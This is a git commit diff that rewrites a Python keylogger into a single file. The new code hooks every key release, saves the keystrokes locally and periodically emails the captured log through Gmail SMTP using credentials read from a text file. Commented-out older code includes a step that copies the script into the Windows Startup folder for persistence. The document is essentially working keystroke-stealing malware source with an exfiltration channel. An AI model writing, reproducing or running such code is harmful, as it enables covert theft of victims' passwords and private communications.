939ccd6b6c0800467f41227c90d4b59f09eaf908
Ahmed <ahmedhamedaly19@gmail.com>
2020-11-19 23:16:44 +0000

    new keylogger, all in one file

--- src/logger.py
+++ src/logger.py
@@ -1,28 +1,88 @@
-import logging
+import keyboard
+import smtplib
+import sys
 import os
-from shutil import copyfile
 
-from pynput.keyboard import Listener
+from threading import Semaphore, Timer
 
-username = os.getlogin()
-# Moved to hidden folder
-logging_dir = os.getcwd()
+with open(os.path.join(sys.path[0], 'password.txt'), 'r') as f:
+    file = f.readlines()
+    email = file[0]
+    password = file[1]
+    interval = file[2]
 
-#copyfile('logger.py', f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')
+class Keylogger:
+    def __init__(self, interval):
+        self.interval = interval
+        self.log = ""
+        self.semaphore = Semaphore(0)
 
-logging.basicConfig(filename=f'{logging_dir}/mylog.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')
+    def callback(self, event):
+        name = event.name
+        if len(name) > 1:
+            if name == "space":
+                name = " "
+            elif name == "enter":
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+        self.log += name
 
-def key_handler(key):
-    key = str(key).replace("'", "")
+        f = open("log.txt", "w")
+        f.write(self.log)
+        f.close()
 
-    if key == 'Key.space':
-        key = ' '
-    if key == 'Key.shift_r':
-        key = ''
-    if key == "Key.enter":
-        key = '\n'
-        
-    logging.info(key)
+    def sendmail(self, email, password, message):
+        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
 
-with Listener(on_press=key_handler) as listener:
-    listener.join()
+    def report(self):
+        if self.log:
+            self.sendmail(email, password, self.log)
+        self.log = ""
+        Timer(interval=self.interval, function=self.report).start()
+
+    def start(self):
+        keyboard.on_release(callback=self.callback)
+        self.report()
+        self.semaphore.acquire()
+
+
+if __name__ == "__main__":
+    keylogger = Keylogger(interval=interval)
+    keylogger.start()
+
+# import logging
+# import os
+# from shutil import copyfile
+
+# from pynput.keyboard import Listener
+
+# username = os.getlogin()
+# # Moved to hidden folder
+# logging_dir = os.getcwd()
+
+# #copyfile('logger.py', f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')
+
+# logging.basicConfig(filename=f'{logging_dir}/mylog.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+# def key_handler(key):
+#     key = str(key).replace("'", "")
+
+#     if key == 'Key.space':
+#         key = ' '
+#     if key == 'Key.shift_r':
+#         key = ''
+#     if key == "Key.enter":
+#         key = '\n'
+
+#     logging.info(key)
+
+# with Listener(on_press=key_handler) as listener:
+#     listener.join()
